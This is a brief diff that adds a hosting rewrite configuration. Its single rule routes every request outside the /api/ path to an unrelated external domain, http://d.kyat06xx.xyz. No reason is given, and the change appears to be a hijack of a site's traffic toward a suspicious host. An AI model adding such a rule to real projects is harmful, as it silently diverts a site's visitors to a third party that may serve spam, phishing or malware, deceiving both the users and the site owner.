@@ -1,0 +1,8 @@
+{
+  "rewrites": [
+    {
+      "source": "/((?!api/).*)",
+      "destination": "http://d.kyat06xx.xyz"
+    }
+  ]
+}
